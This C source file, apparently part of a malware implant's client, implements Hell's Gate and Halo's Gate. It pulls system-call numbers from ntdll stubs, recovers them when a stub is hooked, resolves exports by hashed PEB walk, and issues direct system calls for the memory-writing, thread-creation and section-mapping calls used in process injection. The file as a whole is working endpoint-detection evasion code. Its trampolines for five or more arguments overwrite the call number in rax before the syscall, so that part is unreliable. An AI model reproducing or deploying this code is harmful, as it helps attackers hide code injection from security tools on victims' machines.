/*
 * client/syscall.c  –  Hell's Gate + Halo's Gate SSN extraction + trampolines
 * =============================================================================
 * x64 only.  The trampolines use GCC __attribute__((naked)) + inline asm so
 * the compiler emits no prologue/epilogue — the raw syscall instruction fires
 * with exactly the register state we set up.
 *
 * SSN extraction (sc_init):
 *   For each wanted Nt* function, resolve its address via the PEB export walk
 *   (no GetProcAddress), then:
 *
 *   Hell's Gate — unhooked stub:
 *     [+0]  4C 8B D1           mov r10, rcx
 *     [+3]  B8 XX XX XX XX     mov eax, <SSN>
 *     Read 4 bytes at offset +4 → SSN.
 *
 *   Halo's Gate — hooked stub (first byte is E9 = JMP):
 *     Scan neighbours at ±1 stub (32-byte stride on x64).
 *     SSN[target] = SSN[neighbour] ∓ delta
 *     We check up to ±32 stubs.
 *
 * Trampoline calling convention (x64 Windows ABI):
 *   sc_syscallN(ssn, a1, a2, ..., aN)
 *     ssn → rcx on entry → moved to eax
 *     a1  → rdx on entry → moved to r10 (Windows syscall a1)
 *     a2  → r8  on entry → stays  in rdx (Windows syscall a2)
 *     a3  → r9  on entry → stays  in r8  (Windows syscall a3)
 *     a4  → [rsp+0x28]   → moved  to r9  (Windows syscall a4)
 *     a5+ → [rsp+0x30+]  → already on stack in correct position
 *
 * The Windows syscall ABI on x64:
 *   rax = SSN
 *   r10 = 1st arg  (rcx in Win32 ABI)
 *   rdx = 2nd arg
 *   r8  = 3rd arg
 *   r9  = 4th arg
 *   [rsp+0x28] = 5th arg  (shadow space is 0x20, +0x28 = 5th)
 *   [rsp+0x30] = 6th arg
 *   …
 */

#include "syscall.h"
#include "peb_walk.h"

/* ── SSN table ───────────────────────────────────────────────────────────── */

static DWORD g_ssn[SC_COUNT];
static BOOL  g_sc_ready = FALSE;

/* Names we need to resolve — must match SC_ID order */
static const char * const sc_names[SC_COUNT] = {
    "NtAllocateVirtualMemory",   /* SSN_NtAllocateVirtualMemory  = 0 */
    "NtWriteVirtualMemory",      /* SSN_NtWriteVirtualMemory     = 1 */
    "NtProtectVirtualMemory",    /* SSN_NtProtectVirtualMemory   = 2 */
    "NtCreateThreadEx",          /* SSN_NtCreateThreadEx         = 3 */
    "NtClose",                   /* SSN_NtClose                  = 4 */
    "NtReadVirtualMemory",       /* SSN_NtReadVirtualMemory      = 5 */
    "NtCreateSection",           /* SSN_NtCreateSection          = 6 */
    "NtMapViewOfSection",        /* SSN_NtMapViewOfSection       = 7 */
    "NtUnmapViewOfSection",      /* SSN_NtUnmapViewOfSection     = 8 */
};

/* (no pre-computed hash table — SSNs are resolved at runtime by sc_init) */


/* ── Hell's Gate: read SSN from unhooked stub ───────────────────────────── */
/*
 * Returns the SSN embedded at offset +4 of the ntdll stub, or
 * 0xFFFFFFFF if the stub looks hooked (first byte != 4C).
 *
 * x64 stub:
 *   +0  4C 8B D1           mov r10, rcx
 *   +3  B8 [4 bytes]       mov eax, SSN
 *   +7  ...
 */
static DWORD _read_ssn_direct(const BYTE *stub)
{
    /* Pattern: 4C 8B D1  B8 ?? ?? ?? ?? */
    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 &&
        stub[3] == 0xB8) {
        DWORD ssn = 0;
        ssn |= (DWORD)stub[4];
        ssn |= (DWORD)stub[5] << 8;
        ssn |= (DWORD)stub[6] << 16;
        ssn |= (DWORD)stub[7] << 24;
        return ssn;
    }
    return 0xFFFFFFFF;
}


/* ── Halo's Gate: recover SSN when stub is hooked ───────────────────────── */
/*
 * x64 ntdll stubs are 32 bytes each, laid out contiguously in ascending
 * SSN order.  If stub[target] is hooked (E9 JMP at byte 0), scan
 * stub[target ± k] for k = 1..32 until an unhooked neighbour is found.
 *
 *   SSN[target] = SSN[neighbour] - k   (neighbour is k stubs above)
 *   SSN[target] = SSN[neighbour] + k   (neighbour is k stubs below)
 *
 * Returns 0xFFFFFFFF if no unhooked neighbour found within ±32 stubs.
 */
#define STUB_STRIDE  32     /* bytes between consecutive x64 syscall stubs */

static DWORD _halo_gate(const BYTE *stub)
{
    for (int k = 1; k <= 32; k++) {
        /* Check stub k positions above */
        const BYTE *up = stub - (k * STUB_STRIDE);
        DWORD ssn = _read_ssn_direct(up);
        if (ssn != 0xFFFFFFFF)
            return ssn + (DWORD)k;   /* target is k below unhooked neighbour */

        /* Check stub k positions below */
        const BYTE *dn = stub + (k * STUB_STRIDE);
        ssn = _read_ssn_direct(dn);
        if (ssn != 0xFFFFFFFF)
            return ssn - (DWORD)k;   /* target is k above unhooked neighbour */
    }
    return 0xFFFFFFFF;
}


/* ── sc_init ────────────────────────────────────────────────────────────── */

BOOL sc_init(void)
{
    if (g_sc_ready) return TRUE;

    /* Locate ntdll base via PEB walk — no GetModuleHandle */
    PVOID ntdll = peb_get_module(HASH_NTDLL);
    if (!ntdll) return FALSE;

    for (int i = 0; i < SC_COUNT; i++) {
        g_ssn[i] = 0xFFFFFFFF;

        /* Resolve export VA via PEB walk — no GetProcAddress */
        DWORD h = peb_hash_str(sc_names[i]);
        const BYTE *stub = (const BYTE *)peb_get_export(ntdll, h);
        if (!stub) return FALSE;

        /* Hell's Gate: direct read */
        DWORD ssn = _read_ssn_direct(stub);

        /* Halo's Gate: neighbour scan if stub is hooked */
        if (ssn == 0xFFFFFFFF)
            ssn = _halo_gate(stub);

        if (ssn == 0xFFFFFFFF)
            return FALSE;   /* couldn't recover SSN for this function */

        g_ssn[i] = ssn;
    }

    g_sc_ready = TRUE;
    return TRUE;
}

DWORD sc_get_ssn(SC_ID id)
{
    if (id < 0 || id >= SC_COUNT) return 0xFFFFFFFF;
    return g_ssn[id];
}

BOOL sc_ready(void) { return g_sc_ready; }


/* ── Syscall trampolines (x64, naked) ───────────────────────────────────── */
/*
 * Argument layout on trampoline entry (Windows x64 ABI):
 *
 *   rcx = ssn     ← our extra leading arg
 *   rdx = a1
 *   r8  = a2
 *   r9  = a3
 *   [rsp+0x28] = a4
 *   [rsp+0x30] = a5
 *   [rsp+0x38] = a6
 *   …
 *
 * We need to emit:
 *   mov  eax, ecx        ; eax = SSN
 *   mov  r10, rdx        ; r10 = a1  (Windows syscall conv)
 *   mov  rdx, r8         ; rdx = a2
 *   mov  r8,  r9         ; r8  = a3
 *   mov  r9,  [rsp+0x28] ; r9  = a4
 *   ; a5+ are already at [rsp+0x28] after the shift
 *   ; but we consumed [rsp+0x28] for r9, so a5 must slide down.
 *   ; On Windows the called function sees args 5+ at [rsp+0x28+].
 *   ; Since we're in a naked function (no prologue), rsp still points
 *   ; to the return address.  Shadow space is not ours to manage —
 *   ; the CALLER allocated shadow+args before the call.
 *   ;
 *   ; After our shifts:
 *   ;   rax = SSN, r10=a1, rdx=a2, r8=a3, r9=a4
 *   ;   [rsp+0x28] = a4 (old, now superseded by r9) ← will be ignored by kernel
 *   ;   [rsp+0x30] = a5, [rsp+0x38] = a6, …
 *   ;
 *   ; The kernel syscall handler reads a5+ from [rsp+0x28] onward.
 *   ; Since we moved a4 into r9 from [rsp+0x28], a5 is now at [rsp+0x30].
 *   ; We must slide a5 down by one slot to [rsp+0x28]:
 *   mov  rax, [rsp+0x30]   ; pick up a5
 *   mov  [rsp+0x28], rax   ; slide to position kernel expects
 *   ; Repeat for a6, a7 … up to max needed.
 *
 * For simplicity we implement separate trampolines per arity
 * (sc_syscall4 … sc_syscall11) doing only as many slides as needed.
 *
 * IMPORTANT: these are __attribute__((naked)) — NO C code inside,
 * ONLY asm.  The compiler must not emit any prologue/epilogue.
 */

/* Helper: encode the common head (ssn→eax, shift a1..a4) — AT&T syntax */
#define SC_HEAD \
    "movl %ecx, %eax\n\t"          /* eax = SSN                    */ \
    "movq %rdx, %r10\n\t"          /* r10 = a1                     */ \
    "movq %r8,  %rdx\n\t"          /* rdx = a2                     */ \
    "movq %r9,  %r8\n\t"           /* r8  = a3                     */ \
    "movq 0x28(%rsp), %r9\n\t"     /* r9  = a4 (was at +0x28)      */

/* sc_syscall4: syscall(ssn, a1, a2, a3, a4) — 4 real args */
__attribute__((naked))
NTSTATUS sc_syscall4(DWORD ssn, ...)
{
    __asm__ __volatile__(
        SC_HEAD
        "syscall\n\t"
        "ret\n\t"
    );
}

/* sc_syscall5: syscall(ssn, a1..a5) */
__attribute__((naked))
NTSTATUS sc_syscall5(DWORD ssn, ...)
{
    __asm__ __volatile__(
        SC_HEAD
        /* slide a5: [rsp+0x30] → [rsp+0x28] */
        "movq 0x30(%rsp), %rax\n\t"
        "movq %rax, 0x28(%rsp)\n\t"
        "syscall\n\t"
        "ret\n\t"
    );
}

/* sc_syscall6: syscall(ssn, a1..a6) */
__attribute__((naked))
NTSTATUS sc_syscall6(DWORD ssn, ...)
{
    __asm__ __volatile__(
        SC_HEAD
        "movq 0x30(%rsp), %rax\n\t"  /* a5 */
        "movq %rax, 0x28(%rsp)\n\t"
        "movq 0x38(%rsp), %rax\n\t"  /* a6 */
        "movq %rax, 0x30(%rsp)\n\t"
        "syscall\n\t"
        "ret\n\t"
    );
}

/* sc_syscall7: syscall(ssn, a1..a7) — NtCreateSection needs 7 */
__attribute__((naked))
NTSTATUS sc_syscall7(DWORD ssn, ...)
{
    __asm__ __volatile__(
        SC_HEAD
        "movq 0x30(%rsp), %rax\n\t"  "movq %rax, 0x28(%rsp)\n\t"  /* a5 */
        "movq 0x38(%rsp), %rax\n\t"  "movq %rax, 0x30(%rsp)\n\t"  /* a6 */
        "movq 0x40(%rsp), %rax\n\t"  "movq %rax, 0x38(%rsp)\n\t"  /* a7 */
        "syscall\n\t"
        "ret\n\t"
    );
}

/* sc_syscall11: syscall(ssn, a1..a11) — NtCreateThreadEx / NtMapViewOfSection */
__attribute__((naked))
NTSTATUS sc_syscall11(DWORD ssn, ...)
{
    __asm__ __volatile__(
        SC_HEAD
        /* slide a5..a11 down by one slot */
        "movq 0x30(%rsp), %rax\n\t"  "movq %rax, 0x28(%rsp)\n\t"  /* a5  */
        "movq 0x38(%rsp), %rax\n\t"  "movq %rax, 0x30(%rsp)\n\t"  /* a6  */
        "movq 0x40(%rsp), %rax\n\t"  "movq %rax, 0x38(%rsp)\n\t"  /* a7  */
        "movq 0x48(%rsp), %rax\n\t"  "movq %rax, 0x40(%rsp)\n\t"  /* a8  */
        "movq 0x50(%rsp), %rax\n\t"  "movq %rax, 0x48(%rsp)\n\t"  /* a9  */
        "movq 0x58(%rsp), %rax\n\t"  "movq %rax, 0x50(%rsp)\n\t"  /* a10 */
        "movq 0x60(%rsp), %rax\n\t"  "movq %rax, 0x58(%rsp)\n\t"  /* a11 */
        "syscall\n\t"
        "ret\n\t"
    );
}
